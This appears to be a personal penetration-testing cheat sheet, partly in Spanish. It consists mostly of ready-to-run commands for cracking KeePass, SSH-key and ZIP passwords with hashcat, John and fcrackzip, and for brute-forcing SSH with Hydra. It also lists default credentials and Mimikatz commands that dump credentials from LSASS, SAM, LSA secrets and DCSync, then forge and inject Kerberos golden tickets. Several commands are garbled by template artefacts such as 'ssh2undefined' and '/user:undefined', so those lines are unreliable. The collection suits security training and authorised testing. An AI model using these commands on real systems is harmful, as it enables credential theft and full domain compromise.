# Password cracking:

#### Keepass Database

- Hash de la base de datos 

```sh
keepass2john Database.kdbx > keepass.hash
```

- Eliminar *Database:*
- Cracking con Hashcat 

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```



#### SSH Private Key Passphrase

```
ssh2john id_rsa > ssh.hash
```

```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

![[Pasted image 20250310135421.png]]

```
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

#### Zip cracking

```
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```
zip2john file.zip > zip.john
john zip.john
```


## Mimikatz

^ff8d26

```
privilege::debug
```

```
token::elevate
```

```
lsadump::dcsync /user:dominio\usuario
```

```
sekurlsa::logonpasswords 
```

```
lsadump::sam 
```

```
lsadump::lsa 
```

```
lsadump::cache 
```

```
lsadump::secrets
```

```
kerberos::purge
```


```
misc::cmd
```

> [!example] [mimikatz](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
> 
> ```
> privilege::debug
> token::elevate
> lsadump::sam
> lsadump::lsa
> lsadump::secrets
> sekurlsa::logonpasswords
> lsadump::cache
> ```
> 
> 
> ```
> .\mimikatz "privilege::debug" "token::elevate"  "lsadump::sam " exit
> sekurlsa::minidump /users/admin/Desktop/lsass.DMP
> sekurlsa::LogonPasswords
> ```

> [!example] Generate TGT with NTLM
> 
> ```
> kerberos::golden /domain:<% tp.frontmatter["DOMAIN"] %>/sid:"SID" /rc4:"KRBTGT_NTLM_HASH" /user:undefined
> ```

> [!example] Inject TGT with Mimikatz
> 
> ```
> kerberos::ptt KIRBI_FILE.file
> ```


Default credentials : 

- `admin:admin admin:password root:root root:toor`


```
 john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
```

```
hydra -l noman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
```

## Hashcat

> [!example] Asrep Roast
> 
> ```
> 
> sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
> hashcat -m 18200-a 0asrep.txt passwords.txt --outfile asrepcrack.txt --forcehashcat
> ```

> [!example] Kerberoast 
> 
> ```
> sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r demo_rule2.rule --force> 
> ```

> [!example] keypass
> 
> ```
> keepass2undefined Database.kdbx > keepass.hash
> hashcat --help | grep -i "KeePass"
> hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
> ```

> [!example] id_rsa
> ```
> 
> ssh2undefined id_rsa > ssh.hash
> hashcat -h | grep -i "ssh"
> hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
> hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt
> ```

> [!example] ntlm
> 
> ```
> hashcat --help | grep -i "ntlm"
> hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
> ```

> [!example] ntlmv2
> 
> ```
> hashcat --help | grep -i "ntlm"
> hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
> ```


### Port Kill

sudo fuser -k 443/tcp